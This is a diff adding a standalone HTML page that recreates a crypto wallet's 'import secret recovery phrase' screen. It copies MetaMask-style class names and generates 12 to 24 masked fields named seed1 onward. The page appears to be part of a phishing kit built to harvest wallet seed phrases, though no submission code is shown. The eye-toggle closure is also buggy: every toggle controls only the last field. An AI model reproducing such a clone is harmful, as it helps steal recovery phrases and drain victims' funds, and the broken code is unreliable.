@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Dynamically Generate Fields with Eye Button</title>
+<style>
+  .toggle-password {
+    position: relative;
+    display: inline-block;
+    cursor: pointer;
+  }
+
+  .toggle-password input {
+    padding-right: 30px;
+  }
+
+  .toggle-password .eye-icon {
+    position: absolute;
+    top: 50%;
+    right: 5px; /* Adjust the distance from the right */
+    transform: translateY(-50%);
+    cursor: pointer;
+  }
+</style>
+</head>
+<body>
+  <div class="dropdown import-srp__number-of-words-dropdown">
+    <select class="dropdown__select" onchange="generateFields(this.value)">
+      <option value="12">I have a 12-word phrase</option>
+      <option value="15">I have a 15-word phrase</option>
+      <option value="18">I have a 18-word phrase</option>
+      <option value="21">I have a 21-word phrase</option>
+      <option value="24">I have a 24-word phrase</option>
+    </select>
+    <span class="box dropdown__icon-caret-down mm-icon mm-icon--size-sm box--display-inline-block box--flex-direction-row box--color-inherit" style="-webkit-mask-image: url(_/images/icons/arrow-down.html);"></span>
+  </div>
+
+  <div id="wordFieldsContainer" class="import-srp__srp">
+    <!-- Word fields will be dynamically generated here -->
+  </div>
+
+  <script>
+    function generateFields(numWords) {
+      var container = document.getElementById("wordFieldsContainer");
+      container.innerHTML = ""; // Clear previous fields
+
+      for (var i = 0; i < numWords; i++) {
+        var label = document.createElement("label");
+        label.setAttribute("for", "import-srp__srp-word-" + i);
+        label.className = "import-srp__srp-word-label";
+
+        var p = document.createElement("p");
+        p.className = "box box--margin-top-1 box--margin-bottom-1 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-text-default";
+        p.innerText = (i + 1) + ".";
+
+        label.appendChild(p);
+
+        var inputDiv = document.createElement("div");
+        inputDiv.className = "toggle-password MuiFormControl-root MuiTextField-root";
+
+        var inputBase = document.createElement("div");
+        inputBase.className = "MuiInputBase-root MuiInput-root jss12 MuiInputBase-formControl MuiInput-formControl";
+
+        var input = document.createElement("input");
+        input.setAttribute("aria-invalid", "false");
+        input.setAttribute("autocomplete", "off");
+        input.setAttribute("id", "import-srp__srp-word-" + i);
+        input.setAttribute("pattern", "^[A-Za-z]{2,20}");
+        input.setAttribute("required", "required");
+        input.setAttribute("name", "seed" + (i + 1));
+        input.setAttribute("type", "password");
+        input.setAttribute("dir", "auto");
+        input.setAttribute("data-testid", "import-srp__srp-word-" + i);
+        input.className = "MuiInputBase-input MuiInput-input";
+
+        var eyeIcon = document.createElement("span");
+        eyeIcon.className = "eye-icon";
+        eyeIcon.innerHTML = "&#128065;";
+        eyeIcon.onclick = function() {
+          togglePasswordVisibility(input);
+        };
+
+        inputBase.appendChild(input);
+        inputDiv.appendChild(inputBase);
+        inputDiv.appendChild(eyeIcon);
+
+        container.appendChild(label);
+        container.appendChild(inputDiv);
+      }
+    }
+
+    function togglePasswordVisibility(input) {
+      var type = input.getAttribute("type");
+      if (type === "password") {
+        input.setAttribute("type", "text");
+      } else {
+        input.setAttribute("type", "password");
+      }
+    }
+  </script>
+</body>
+</html>
